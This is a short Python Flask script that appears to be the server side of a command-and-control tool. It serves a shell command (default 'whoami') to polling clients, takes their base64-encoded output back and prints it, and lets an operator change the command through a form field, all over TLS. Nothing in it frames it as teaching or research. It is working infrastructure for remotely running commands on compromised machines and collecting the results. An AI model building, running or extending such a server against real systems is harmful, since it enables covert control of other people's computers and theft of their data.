from flask import Flask, request
import base64
myAPP = Flask(__name__) #https://flask.palletsprojects.com/en/stable/tutorial/factory/
command = "whoami"

@myAPP.route('/getCMD',methods=['GET'])
def getCMD():
    return command


@myAPP.route('/postOUTPUT',methods=['POST'])
def postOUTPUT():
    clientRequestData = request.data.decode()
    data = base64.b64decode(clientRequestData).decode()
    print(f"\nClient executed '{command}'")
    print(f"\n{data}") 
    return "Ok" #All route handlers must return a response.
    

@myAPP.route('/postCMD',methods=['POST'])
def postCMD():
    global command
    if request.form.get("cmd"):
        data = request.form.get("cmd")
        command = data
        print(f"\n{command} <-")
    return "[cmd updated]"

if __name__ == '__main__':
    myAPP.run(ssl_context=("certs/server.crt", "certs/server.key"))


